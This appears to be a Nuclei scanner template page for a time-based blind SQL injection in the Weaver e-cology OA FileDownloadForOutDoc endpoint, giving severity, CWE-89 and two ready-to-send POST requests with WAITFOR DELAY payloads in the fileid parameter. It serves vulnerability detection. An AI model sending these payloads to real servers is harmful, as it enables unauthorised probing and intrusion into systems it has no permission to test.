# Nuclei Template: E-cology FileDownloadForOutDocSQL - SQL Injection
**Template ID:** ecology-oa-file-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`ecology-oa-file-sqli.yaml`)

## Vulnerability Information & PoC

## Description
e-cology did not effectively filter the user input, but directly spliced it into the SQL query statement, resulting in SQL injection vulnerabilities in the system

## Steps to reproduce / Exploit Payload
```http
@timeout: 15s
POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1
Host: {{Hostname}}

isFromOutImg=1&fileid=%d+WAITFOR+DELAY+'0:0:7'

@timeout: 35s
POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1
Host: {{Hostname}}

isFromOutImg=1&fileid=%d+WAITFOR+DELAY+'0:0:15'
```

## References
- https://github.com/TgHook/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E6%B3%9B%E5%BE%AEOA%20e-cology%20FileDownloadForOutDoc%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
